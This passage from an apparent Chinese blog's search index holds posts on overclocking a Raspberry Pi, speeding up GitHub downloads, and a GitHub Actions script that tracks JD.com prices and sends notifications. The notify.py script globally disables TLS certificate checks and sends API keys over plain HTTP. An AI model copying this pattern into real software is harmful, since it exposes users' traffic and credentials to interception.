title=\"开始\"></a>开始</h2>\n<p>登录树莓派，进入 <code>/boot/firmware/</code> 目录：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">cd</span> /boot/firmware/</span><br></pre></td></tr></table></figure><div class=\"note note-warning\">            <p>网上很多教程让你修改 <code>config.txt</code> 文件，但注释里已经很明确的写了：</p>\n<figure class=\"highlight text\"><table><tr><td class=\"code\"><pre><span class=\"line\"># Please DO NOT modify this file; if you need to modify the boot config, the</span><br><span class=\"line\"># \"usercfg.txt\" file is the place to include user changes. Please refer to</span><br><span class=\"line\"># the README file for a description of the various configuration files on</span><br><span class=\"line\"># the boot partition.</span><br></pre></td></tr></table></figure>\n</div>\n<p>我们修改 <code>usercfg.txt</code> 文件：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo vim usercfg.txt</span><br></pre></td></tr></table></figure><p>在文件末尾追加配置信息，以下是我的，仅供参考：</p>\n<div class=\"note note-danger\">            <p>我使用的是 <code>Raspberry Pi 4 (4GB)</code>，并且有小风扇和散热片。<br>请根据自己的需要和配置进行更改。</p>          </div>\n<figure class=\"highlight text\"><table><tr><td class=\"code\"><pre><span class=\"line\">force_turbo=0</span><br><span class=\"line\">arm_freq=1850</span><br><span class=\"line\">over_voltage=6</span><br><span class=\"line\">gpu_freq=650</span><br><span class=\"line\">core_freq=650</span><br><span class=\"line\">gpu_mem=620</span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#%E9%87%8D%E5%90%AF\" class=\"headerlink\" title=\"重启\"></a>重启</h2>\n<p>保存文件，使用命令重启：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo reboot</span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#%E5%90%8E\" class=\"headerlink\" title=\"后\"></a>后</h2>\n<p>重启完毕后，再使用 <code>lscpu</code> 命令看看 CPU 状况。</p>\n","link":"https://blog.yfun.top/posts/1445549919/"},{"title":"加速 GitHub 下载","date":"2021-06-18 09:30:00","description":"\n<p>GitHub 在国内的访问情况不太稳定，仓库克隆速度也非常慢。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E2%9C%88%EF%B8%8F\" class=\"headerlink\" title=\"✈️\"></a>✈️</h2>\n<p>不必多说。</p>\n<p>例如 <a href=\"http://127.0.0.1:7890/\">http://127.0.0.1:7890</a> 为代理地址，你可以使用下方的命令更改：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">git config --global http.proxy http://127.0.0.1:7890</span><br></pre></td></tr></table></figure><p>如果有一天不需要了，输入下面代码取消：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">git config --global --<span class=\"built_in\">unset</span> http.proxy</span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#FastGit\" class=\"headerlink\" title=\"FastGit\"></a>FastGit</h2>\n<p>使用 <a href=\"https://fastgit.org/\">FastGit</a> 提供的 GitHub 镜像。</p>\n<p>镜像地址：<a href=\"https://hub.fastgit.org/\">https://hub.fastgit.org</a></p>\n<p>支持 HTTPS 克隆，并且提供 raw.githubusercontent.com 的镜像，地址为 <a href=\"https://raw.fastgit.org/\">https://raw.fastgit.org</a></p>\n<h2>\n<a href=\"https://blog.yfun.top/#CNPM\" class=\"headerlink\" title=\"CNPM\"></a>CNPM</h2>\n<p>使用 <a href=\"https://cnpmjs.org/\">CNPM</a> 提供的 GitHub 镜像。</p>\n<p>镜像地址：<a href=\"https://github.com.cnpmjs.org/\">https://github.com.cnpmjs.org</a></p>\n<p>支持 HTTPS 克隆。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#Hosts\" class=\"headerlink\" title=\"Hosts\"></a>Hosts</h2>\n<p>通过更改 Hosts 文件的方式解决，但大有可能失效：</p>\n<figure class=\"highlight text\"><table><tr><td class=\"code\"><pre><span class=\"line\">199.232.69.194  github.global.ssl.fastly.net</span><br><span class=\"line\">140.82.113.4    github.com</span><br></pre></td></tr></table></figure><p>GitHub 上的 <a href=\"https://github.com/521xueweihan/GitHub520\">521xueweihan/GitHub520</a> 项目提供了更多关于 GitHub Hosts 列表。</p>\n<blockquote><p><a href=\"https://github.com/521xueweihan/GitHub520/issues/53\">521xueweihan/GitHub520 #53</a></p></blockquote>\n<h2>\n<a href=\"https://blog.yfun.top/#Gitee\" class=\"headerlink\" title=\"Gitee\"></a>Gitee</h2>\n<p>网上挺多教程，使用 Gitee 的「从 GitHub 导入」功能。</p>\n<p>不过 Gitee 限制仓库 500MB。。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#Coding\" class=\"headerlink\" title=\"Coding\"></a>Coding</h2>\n<p>进入 Coding 控制台，点击「创建项目」。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/k7uHJm.png\"></p>\n<p>项目模版选择「代码托管」就好，仅做下载的话无需开启太多。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/bEO0vX.png\"></p>\n<p>填写项目基本信息，如名称、标识等。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/N4xjSv.png\"></p>\n<p>新建一个镜像仓库。</p>\n<p>「Git 仓库 URL」填写 GitHub 公开仓库 HTTPS 克隆地址，如：<a href=\"https://github.com/twbs/bootstrap.git\">https://github.com/twbs/bootstrap.git</a></p>\n<p>创建完成后请稍等，系统就会自动导入。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/YxnnDj.png\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/FmfWkf.png\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/OV7w4v.png\"></p>\n<p>导入完成后，点击「克隆」就能找到克隆地址。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/bWszbu.png\"></p>\n<p>克隆速度挺快的：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">Cloning into <span class=\"string\">'bootstrap'</span>...</span><br><span class=\"line\">remote: Enumerating objects: 169214, <span class=\"keyword\">done</span>.</span><br><span class=\"line\">remote: Counting objects: 100% (169214/169214), <span class=\"keyword\">done</span>.</span><br><span class=\"line\">remote: Compressing objects: 100% (51634/51634), <span class=\"keyword\">done</span>.</span><br><span class=\"line\">Receiving objects:  57% (96728/169214), 90.58 MiB | 6.83 MiB/s </span><br></pre></td></tr></table></figure><p>此外，Coding 还支持自动同步，可以设置每天的同步时间。</p>\n","link":"https://blog.yfun.top/posts/2517388641/"},{"title":"GitHub Action 监测京东商品价格","date":"2021-05-18 10:32:00","description":"\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%89%8D%E8%A8%80\" class=\"headerlink\" title=\"前言\"></a>前言</h2>\n<p>我会在京东上买些电子产品和文具，那么如何获得商品降价信息，使用更低的价格购买呢？</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%BC%80%E5%A7%8B\" class=\"headerlink\" title=\"开始\"></a>开始</h2>\n<p>新建一个 <code>GitHub</code> 仓库，创建 <code>main.py</code> , <code>notify.py</code> 和 <code>.github/workflows/auto.yml</code> 三个文件，内容如下：</p>  <details class=\"post-details\"><summary><code>main.py</code> (点击展开)</summary><div class=\"details-content\">  <figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># -*- coding: utf-8 -*-</span></span><br><span class=\"line\"><span class=\"comment\"># 导入模块</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> urllib.request, random, json, notify</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 商品列表</span></span><br><span class=\"line\">check = [</span><br><span class=\"line\">    <span class=\"comment\"># 闪迪（SanDisk）64GB TF（MicroSD）存储卡</span></span><br><span class=\"line\">    <span class=\"string\">'1887526'</span>,</span><br><span class=\"line\">    <span class=\"comment\"># 晨光(M&amp;G)文具 0.5mm 黑色中性笔</span></span><br><span class=\"line\">    <span class=\"string\">'277393'</span></span><br><span class=\"line\"><span class=\"comment\"># ...</span></span><br><span class=\"line\">]</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 价格列表，用于临时存储获取到的价格数据</span></span><br><span class=\"line\">price = {}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 读取上次的价格文件</span></span><br><span class=\"line\"><span class=\"keyword\">try</span>:</span><br><span class=\"line\">    file = <span class=\"built_in\">open</span>(<span class=\"string\">'./price.json'</span>, mode=<span class=\"string\">'r'</span>)</span><br><span class=\"line\">    lastPrice = json.loads(file.readlines()[<span class=\"number\">0</span>])</span><br><span class=\"line\"><span class=\"keyword\">except</span>:</span><br><span class=\"line\">    print(<span class=\"string\">\"读取文件时出现错误！\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 遍历列表，比对价格</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> itemId <span class=\"keyword\">in</span> check:</span><br><span class=\"line\">    <span class=\"comment\"># 组合请求 URL</span></span><br><span class=\"line\">    <span class=\"comment\"># http://p.3.cn/prices/mgets?skuIds=J_</span></span><br><span class=\"line\">    url = <span class=\"string\">'http://p.3.cn/prices/mgets?skuIds=J_{}'</span>.<span class=\"built_in\">format</span>(itemId)</span><br><span class=\"line\">    <span class=\"comment\"># User-Agent 列表</span></span><br><span class=\"line\">    ua = [<span class=\"string\">'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36'</span>,<span class=\"string\">'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36'</span>,<span class=\"string\">'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36 OPR/26.0.1656.60'</span>,<span class=\"string\">'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50'</span>,<span class=\"string\">'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50'</span>]</span><br><span class=\"line\">    <span class=\"comment\"># 随机获得一个 User-Agent，如不带 User-Agent 请求，就会被拒绝。</span></span><br><span class=\"line\">    headers = {</span><br><span class=\"line\">        <span class=\"string\">'User-Agent'</span>: ua[random.randint(<span class=\"number\">0</span>,<span class=\"number\">4</span>)]</span><br><span class=\"line\">    }</span><br><span class=\"line\">    <span class=\"comment\"># 组合请求参数</span></span><br><span class=\"line\">    request = urllib.request.Request(url = url, headers = headers)</span><br><span class=\"line\">    <span class=\"comment\"># 向京东发起请求</span></span><br><span class=\"line\">    response = urllib.request.urlopen(request)</span><br><span class=\"line\">    <span class=\"comment\"># 将获得的数据转为 JSON</span></span><br><span class=\"line\">    page_text = json.loads(response.read().decode(<span class=\"string\">'utf-8'</span>))</span><br><span class=\"line\">    thisPrice = <span class=\"built_in\">float</span>(page_text[<span class=\"number\">0</span>][<span class=\"string\">'p'</span>])</span><br><span class=\"line\">    <span class=\"comment\"># 将价格输入至价格变量</span></span><br><span class=\"line\">    price[itemId] = thisPrice</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># 尝试对比价格</span></span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        <span class=\"keyword\">if</span> thisPrice &gt; lastPrice[itemId]:</span><br><span class=\"line\">            print(<span class=\"string\">\"{0} 涨价\"</span>.<span class=\"built_in\">format</span>(itemId))</span><br><span class=\"line\"></span><br><span class=\"line\">            print(thisPrice - lastPrice[itemId])</span><br><span class=\"line\">            notify.notify(itemId, <span class=\"number\">0</span>, thisPrice - lastPrice[itemId], thisPrice)</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">elif</span> thisPrice &lt; lastPrice[itemId]:</span><br><span class=\"line\">            print(<span class=\"string\">\"{0} 降价\"</span>.<span class=\"built_in\">format</span>(itemId))</span><br><span class=\"line\">            print(lastPrice[itemId] - thisPrice)</span><br><span class=\"line\">            notify.notify(itemId, <span class=\"number\">2</span>, lastPrice[itemId] - thisPrice, thisPrice)</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">elif</span> lastPrice[itemId] == thisPrice:</span><br><span class=\"line\">            print(<span class=\"string\">\"{0} 价格不变\"</span>.<span class=\"built_in\">format</span>(itemId))</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            print(<span class=\"string\">\"{0} 未知错误\"</span>.<span class=\"built_in\">format</span>(itemId))</span><br><span class=\"line\">    <span class=\"keyword\">except</span>:</span><br><span class=\"line\">        print(<span class=\"string\">\"无法进行比对\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 将 JSON 转为 字符串</span></span><br><span class=\"line\">priceStr = json.dumps(price)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 写入价格文件，便于下次查询</span></span><br><span class=\"line\"><span class=\"keyword\">try</span>:</span><br><span class=\"line\">    file = <span class=\"built_in\">open</span>(<span class=\"string\">'./price.json'</span>, mode = <span class=\"string\">'w'</span>)</span><br><span class=\"line\">    file.write(priceStr)</span><br><span class=\"line\">    file.close()</span><br><span class=\"line\"><span class=\"keyword\">except</span>:</span><br><span class=\"line\">    print(<span class=\"string\">\"写入文件时出现错误\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">print(price)</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n</div></details><details class=\"post-details\"><summary><code>notify.py</code> (点击展开)</summary><div class=\"details-content\">  <figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># -*- coding: utf-8 -*-</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> urllib.request, json, urllib.parse, ssl</span><br><span class=\"line\">ssl._create_default_https_context = ssl._create_unverified_context</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\"><span class=\"string\">提醒的服务，支持 `wechat` 与 `qmsg`。</span></span><br><span class=\"line\"><span class=\"string\">需要在下方进行下一步的配置</span></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\">server = [<span class=\"string\">'qmsg'</span>]</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\"><span class=\"string\">WeChat 采用的是 Server 酱 (https://sc.ftqq.com/3.version) 提供的服务</span></span><br><span class=\"line\"><span class=\"string\">key：Server 酱提供的 Token，必填。</span></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\">wechat = {</span><br><span class=\"line\">    <span class=\"string\">\"key\"</span>: <span class=\"string\">\"\"</span></span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\"><span class=\"string\">Qmsg 采用的是 Qmsg 酱 (https://qmsg.zendee.cn/) 提供的服务</span></span><br><span class=\"line\"><span class=\"string\">key：Qmsg 酱提供的 KEY，必填。</span></span><br><span class=\"line\"><span class=\"string\">qid：接收消息的 QQ 号（不支持 QQ 群），可以添加多个，以半角逗号分割，如：`10001,10002`（必须均在您的 Qmsg 酱 QQ 号列表中）。</span></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\">qmsg = {</span><br><span class=\"line\">    <span class=\"string\">\"key\"</span>: <span class=\"string\">\"\"</span>,</span><br><span class=\"line\">    <span class=\"string\">\"qid\"</span>: <span class=\"string\">\"\"</span></span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">wechat_send</span>(<span class=\"params\">key, title, text</span>):</span></span><br><span class=\"line\">    url = <span class=\"string\">'http://sc.ftqq.com/{0}.send?text={1}&amp;desp={2}'</span>.<span class=\"built_in\">format</span>(key, urllib.parse.quote(title), urllib.parse.quote(text))</span><br><span class=\"line\">    headers = {</span><br><span class=\"line\">        <span class=\"string\">'User-Agent'</span>: <span class=\"string\">\"Check Price Bot\"</span></span><br><span class=\"line\">    }</span><br><span class=\"line\">    request = urllib.request.Request(url=url, headers=headers)</span><br><span class=\"line\">    response = urllib.request.urlopen(request)</span><br><span class=\"line\">    page_text = json.loads(response.read().decode(<span class=\"string\">'utf-8'</span>))</span><br><span class=\"line\">    <span class=\"keyword\">if</span> page_text[<span class=\"string\">'errno'</span>] == <span class=\"number\">0</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">True</span></span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">qmsg_send</span>(<span class=\"params\">key, <span class=\"built_in\">id</span>, text</span>):</span></span><br><span class=\"line\">    url = <span class=\"string\">'http://qmsg.zendee.cn/send/{0}?msg={1}&amp;qq={2}'</span>.<span class=\"built_in\">format</span>(key, urllib.parse.quote(text), <span class=\"built_in\">id</span>)</span><br><span class=\"line\">    headers = {</span><br><span class=\"line\">        <span class=\"string\">'User-Agent'</span>: <span class=\"string\">\"Check Price Bot\"</span></span><br><span class=\"line\">    }</span><br><span class=\"line\">    request = urllib.request.Request(url=url, headers=headers)</span><br><span class=\"line\">    response = urllib.request.urlopen(request)</span><br><span class=\"line\">    page_text = json.loads(response.read().decode(<span class=\"string\">'utf-8'</span>))</span><br><span class=\"line\">    <span class=\"keyword\">if</span> page_text[<span class=\"string\">'code'</span>] == <span class=\"number\">0</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">True</span></span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">notify</span>(<span class=\"params\"><span class=\"built_in\">id</span>,<span class=\"built_in\">type</span>,price,nowPrice</span>):</span></span><br><span class=\"line\">    <span class=\"string\">'''</span></span><br><span class=\"line\"><span class=\"string\">    type:</span></span><br><span class=\"line\"><span class=\"string\">        0: 涨价</span></span><br><span class=\"line\"><span class=\"string\">        1: 无变化</span></span><br><span class=\"line\"><span class=\"string\">        2: 降价</span></span><br><span class=\"line\"><span class=\"string\">    id: 商品 ID</span></span><br><span class=\"line\"><span class=\"string\">    price: 差价</span></span><br><span class=\"line\"><span class=\"string\">    nowPrice: 现价</span></span><br><span class=\"line\"><span class=\"string\">    '''</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> svId <span class=\"keyword\">in</span> server:</span><br><span class=\"line\">        <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">send</span>(<span class=\"params\">title,content</span>):</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> svId == <span class=\"string\">'wechat'</span>:</span><br><span class=\"line\">                wechat_send(wechat[<span class=\"string\">\"key\"</span>],title,content)</span><br><span class=\"line\">            <span class=\"keyword\">if</span> svId == <span class=\"string\">'qmsg'</span>:</span><br><span class=\"line\">                qmsg_send(qmsg[<span class=\"string\">\"key\"</span>],qmsg[<span class=\"string\">\"qid\"</span>],title + <span class=\"string\">\"\\n\"</span> + content)</span><br><span class=\"line\">            <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"built_in\">type</span> == <span class=\"number\">0</span>:</span><br><span class=\"line\">            title = <span class=\"string\">\"商品 {0} 涨价!\"</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">id</span>)</span><br><span class=\"line\">            content = <span class=\"string\">\"您关注的商品 {0} 涨价咯！价格相较于上次监测，高了 {1} 元，现价 {2} 元。商品详情：https://item.jd.com/{0}.html\"</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">id</span>,price,nowPrice)</span><br><span class=\"line\">            send(title,content)</span><br><span class=\"line\">        <span class=\"keyword\">elif</span> <span class=\"built_in\">type</span> == <span class=\"number\">1</span>:</span><br><span class=\"line\">            print(<span class=\"string\">\"价格没有变化，不推送通知。\"</span>)</span><br><span class=\"line\">        <span class=\"keyword\">elif</span> <span class=\"built_in\">type</span> == <span class=\"number\">2</span>:</span><br><span class=\"line\">            title = <span class=\"string\">\"商品 {0} 降价!\"</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">id</span>)</span><br><span class=\"line\">            content = <span class=\"string\">\"您关注的商品 {0} 降价咯！价格相较于上次监测，低了 {1} 元，现价 {2} 元。商品详情：https://item.jd.com/{0}.html\"</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">id</span>, price,nowPrice)</span><br><span class=\"line\">            send(title, content)</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br></pre></td></tr></table></figure>\n</div></details><details class=\"post-details\"><summary><code>.github/workflows/auto.yml</code> (点击展开)</summary><div class=\"details-content\">  <figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">name:</span> <span class=\"string\">Check</span> <span class=\"string\">Price</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">on:</span></span><br><span class=\"line\">  <span class=\"attr\">push:</span></span><br><span class=\"line\">    <span class=\"attr\">branches:</span> </span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"string\">master</span></span><br><span class=\"line\">  <span class=\"attr\">schedule:</span></span><br><span class=\"line\">    <span class=\"comment\"># 每 1 小时运行一次</span></span><br><span class=\"line\">    <span class=\"bullet\">-</span> <span class=\"attr\">cron:</span> <span class=\"string\">\"0 * * * *\"</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">jobs:</span></span><br><span class=\"line\">  <span class=\"attr\">check:</span></span><br><span class=\"line\">    <span class=\"attr\">runs-on:</span> <span class=\"string\">ubuntu-latest</span></span><br><span class=\"line\">    <span class=\"attr\">steps:</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Clone</span> <span class=\"string\">repository</span></span><br><span class=\"line\">        <span class=\"attr\">uses:</span> <span class=\"string\">actions/checkout@v2</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">'Set up Python'</span></span><br><span class=\"line\">        <span class=\"attr\">uses:</span> <span class=\"string\">actions/setup-python@v2</span></span><br><span class=\"line\">        <span class=\"attr\">with:</span></span><br><span class=\"line\">          <span class=\"attr\">python-version:</span> <span class=\"number\">3.7</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Run</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">python</span> <span class=\"string\">main.py</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Push</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">config</span> <span class=\"string\">--local</span> <span class=\"string\">user.email</span> <span class=\"string\">\"icolabot@e.yfun.top\"</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">config</span> <span class=\"string\">--local</span> <span class=\"string\">user.name</span> <span class=\"string\">\"iColaBot\"</span></span><br><span class=\"line\">          <span class=\"string\">date</span> <span class=\"string\">+\"%Y-%m-%d</span> <span class=\"string\">%H:%M:%S.%N\"</span> <span class=\"string\">&gt;</span> <span class=\"string\">date.txt</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">add</span> <span class=\"string\">-A</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">commit</span> <span class=\"string\">-am</span> <span class=\"string\">\"Update price.json\"</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">push</span> <span class=\"string\">origin</span> <span class=\"string\">master</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n</div></details><h2>\n<a href=\"https://blog.yfun.top/#%E6%B3%A8%E6%84%8F\" class=\"headerlink\" title=\"注意\"></a>注意</h2>\n<p>计划任务语法有 5 个字段，中间用空格分隔，每个字段代表一个时间单位。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">┌───────────── 分钟 (0 - 59)</span><br><span class=\"line\">│ ┌───────────── 小时 (0 - 23)</span><br><span class=\"line\">│ │ ┌───────────── 日 (1 - 31)</span><br><span class=\"line\">│ │ │ ┌───────────── 月 (1 - 12 或 JAN-DEC)</span><br><span class=\"line\">│ │ │ │ ┌───────────── 星期 (0 - 6 或 SUN-SAT)</span><br><span class=\"line\">│ │ │ │ │</span><br><span class=\"line\">│ │ │ │ │</span><br><span class=\"line\">│ │ │ │ │</span><br><span class=\"line\">* * * * *</span><br></pre></td></tr></table></figure><p>每个时间字段的含义：</p>\n<table>\n<thead><tr>\n<th align=\"center\">符号</th>\n<th align=\"center\">描述</th>\n<th align=\"center\">举例</th>\n</tr></thead>\n<tbody>\n<tr>\n<td align=\"center\"><code>*</code></td>\n<td align=\"center\">任意值</td>\n<td align=\"center\">\n<code>* * * * *</code> 每天每小时每分钟</td>\n</tr>\n<tr>\n<td align=\"center\"><code>,</code></td>\n<td align=\"center\">值分隔符</td>\n<td align=\"center\">\n<code>1,3,4,7 * * * *</code> 每小时的 1 3 4 7 分钟</td>\n</tr>\n<tr>\n<td align=\"center\"><code>-</code></td>\n<td align=\"center\">范围</td>\n<td align=\"center\">\n<code>1-6 * * * *</code> 每小时的 1-6 分钟</td>\n</tr>\n<tr>\n<td align=\"center\"><code>/</code></td>\n<td align=\"center\">每</td>\n<td align=\"center\">\n<code>*/15 * * * *</code> 每隔 15 分钟</td>\n</tr>\n</tbody>\n</table>\n<blockquote><p>注：由于 GitHub Actions 的限制，如果设置为 <code>* * * * *</code> 实际的执行频率为每 5 分执行一次。</p></blockquote>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%90%8E\" class=\"headerlink\" title=\"后\"></a>后</h2>\n<p>新建文件 并 配置 <code>notify.py</code> 后，GitHub Action 就会定时执行代码。如果有降价或涨价，就会按照 <code>notify.py</code> 的配置进行通知。</p>\n<p>京东也有降价提醒的功能，但我实在是不想给 京东 开通知权限，经常推送商品广告。</p>\n<p>本文部分内容参考：<a href=\"https://github.com/justjavac/auto-green#readme\">justjavac/auto-green#readme</a></p>\n","link":"https://blog.yfun.top/posts/1238639652/"},{"title":"我的图床解决方案","date":"2021-05-08 10:30:00","description":"\n<p>博客的文章经常需要插入图片，如果我将文档与图片放在一起，那么图片的加载速度将会很慢，于是我使用了图床。</p>\n<p>图床的选择有很多，<a href=\"https://blog.yfun.top/posts/3867215122/\">笔者之前写过一篇关于免费图床的汇总</a>，本文就来介绍下我采用的方案：NPM。</p>\n<blockquote><p>本文假设您已有 NPM 账号、GitHub 账号。</p></blockquote>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%87%86%E5%A4%87%E5%B7%A5%E4%BD%9C\" class=\"headerlink\" title=\"准备工作\"></a>准备工作</h2>\n<h3>\n<a href=\"https://blog.yfun.top/#%E6%96%B0%E5%BB%BA%E4%BB%93%E5%BA%93\" class=\"headerlink\" title=\"新建仓库\"></a>新建仓库</h3>\n<p>新建一个 GitHub 仓库，公开或是私人都可以，此处不再赘述。</p>\n<p>在 Git 仓库中新建 <code>rawimg/.gitkeep</code> 与 <code>webpimg/.gitkeep</code> 两个文件。</p>\n<h3>\n<a href=\"https://blog.yfun.top/#%E8%8E%B7%E5%8F%96%E4%BB%A4%E7%89%8C\" class=\"headerlink\" title=\"获取令牌\"></a>获取令牌</h3>\n<p>登录 <a href=\"https://npmjs.com/\">https://npmjs.com</a> ，点击右上角的头像，进入 <code>Access Token</code>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/1Xbrlw.png\"></p>\n<p>点击页面中的 <code>Generate New Token</code> 获取新的令牌。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/OQMmsB.png\"></p>\n<p>选择 <code>Automation</code>，点击 <code>Generate Token</code> 生成令牌。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/4Ob3xs.png\"></p>\n<p>将生成的令牌复制下来。</p>\n<p>进入 GitHub 仓库，点击 <code>Settings</code>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/UfBqld.png\"></p>\n<p>点击菜单栏中的 <code>Secrets</code>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/SStNlF.png\"></p>\n<p>点击 <code>New repository secret</code> 新建一个 Secret。</p>\n<p><img 